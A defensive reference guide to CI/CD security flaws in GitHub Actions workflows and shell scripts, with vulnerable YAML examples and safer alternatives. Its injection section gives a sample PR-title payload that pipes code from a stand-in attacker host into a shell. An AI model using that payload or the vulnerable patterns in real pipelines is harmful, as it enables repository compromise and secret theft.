# CI/CD and Workflow Patterns

Patterns for GitHub Actions injection, permission abuse, artifact poisoning, unsafe triggers, shell script issues, and related CI/CD vulnerabilities.

---

## Table of contents

1. [GitHub Actions code injection](#github-actions-code-injection)
2. [GitHub Actions permission abuse](#github-actions-permission-abuse)
3. [Unsafe workflow triggers](#unsafe-workflow-triggers)
4. [Artifact poisoning](#artifact-poisoning)
5. [Secrets exposure in CI/CD](#secrets-exposure-in-cicd)
6. [Shell script issues](#shell-script-issues)
7. [Vulnerable and unpinned actions](#vulnerable-and-unpinned-actions)

---

## GitHub Actions code injection

User-controlled input from PR titles, branch names, commit messages, issue bodies, or discussion comments injected into `run:` steps or action inputs that execute shell commands.

### Dangerous patterns

**Direct injection in `run:` blocks:**
```yaml
# VULNERABLE: PR title injected into shell
run: echo "PR: ${{ github.event.pull_request.title }}"

# VULNERABLE: issue body
run: echo "${{ github.event.issue.body }}"

# VULNERABLE: commit message
run: echo "${{ github.event.head_commit.message }}"

# VULNERABLE: branch name
run: echo "${{ github.head_ref }}"
```

An attacker sets a PR title like `"; curl evil.com/pwn | sh; #` and the shell executes it.

### Dangerous expression contexts
Any `${{ }}` expression containing attacker-controlled data in a `run:` step:
- `github.event.pull_request.title`
- `github.event.pull_request.body`
- `github.event.issue.title`
- `github.event.issue.body`
- `github.event.comment.body`
- `github.event.review.body`
- `github.event.discussion.title`
- `github.event.discussion.body`
- `github.head_ref`
- `github.event.head_commit.message`
- `github.event.commits[*].message`
- `github.event.pages[*].page_name`

### Safe alternative
Set the value as an environment variable (shell handles escaping):
```yaml
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "$PR_TITLE"
```

---

## GitHub Actions permission abuse

### Overly broad permissions
```yaml
# VULNERABLE: write-all when only contents read is needed
permissions: write-all

# VULNERABLE: default permissions not restricted
# (no permissions: key at all -- inherits repo defaults, often broad)
```

### Missing least-privilege
- Workflow has `contents: write` but only reads files.
- `pull-requests: write` granted to steps that don't need it.
- `id-token: write` granted unnecessarily (enables OIDC token minting).
- Job-level permissions not set when workflow-level is broad.

### Best practice
Set `permissions: {}` at workflow level, then grant minimally per job:
```yaml
permissions: {}
jobs:
  build:
    permissions:
      contents: read
```

---

## Unsafe workflow triggers

### `pull_request_target`
Runs in the context of the **base** branch with **write** permissions, but can check out the PR's head (attacker-controlled code).

```yaml
# DANGEROUS: checks out attacker's code with base branch permissions
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}
  - run: npm install  # executes attacker's package.json scripts
```

### `workflow_run`
Triggered by another workflow's completion. If the triggering workflow is `pull_request` (from a fork), `workflow_run` still gets write access and secrets.

### `issue_comment` / `issues`
Triggered by external users. If the workflow runs code based on issue content, it can be injected.

---

## Artifact poisoning

### Unsafe artifact consumption
```yaml
# DANGEROUS: downloading and executing artifact from untrusted workflow
- uses: actions/download-artifact@v4
  with:
    name: build-output
- run: chmod +x ./build-output/run.sh && ./run.sh
```

Artifacts uploaded by one job/workflow can be tampered with if the uploading workflow runs untrusted code (e.g. from a PR).

### Cross-workflow artifact trust
- Artifact downloaded from a `workflow_run` triggered by a fork PR.
- No integrity check (checksum, signature) on downloaded artifact.
- Artifact name collision: attacker uploads artifact with same name as trusted one.

---

## Secrets exposure in CI/CD

- Secrets printed in logs: `echo ${{ secrets.TOKEN }}` (GitHub masks known secrets, but derived values or partial secrets may leak).
- Secrets passed as command-line arguments (visible in process listing): `curl -H "Authorization: ${{ secrets.TOKEN }}"` in `run:` step is OK (env var), but `run: my-tool --token=${{ secrets.TOKEN }}` exposes in process args.
- Secrets in artifact uploads: build output or logs containing secret values uploaded as artifacts.
- Secrets accessible to forked PR workflows (only applies to `pull_request_target` and `workflow_run`).
- `.env` files with secrets committed or generated and not gitignored.

---

## Shell script issues

For shell scripts (`.sh`, `.bash`) in the repo, especially those called from CI/CD:

- **Command injection**: Variables expanded without quoting in commands: `rm -rf $DIR` vs `rm -rf "$DIR"`.
- **Glob injection**: Unquoted variable expansion where filenames could contain special characters.
- **Eval injection**: `eval "$user_input"` or `eval $(command)` with untrusted input.
- **Curl piped to shell**: `curl url | sh` without integrity verification.
- **Temporary file race**: Using predictable temp file names (`/tmp/myapp.$$`) instead of `mktemp`.
- **Missing `set -euo pipefail`**: Script continues after errors, potentially in an inconsistent state.

---

## Vulnerable and unpinned actions

- **Unpinned actions**: `uses: actions/checkout@main` or `uses: third-party/action@v1` (tag can be moved). Pin to full SHA: `uses: actions/checkout@<sha>`.
- **Known vulnerable actions**: Outdated action versions with known CVEs (check action repo for security advisories).
- **Untrusted third-party actions**: Actions from unknown publishers that execute in the workflow with access to secrets and permissions.
- **Actions with `script` inputs**: Actions that accept and execute user-provided script content.
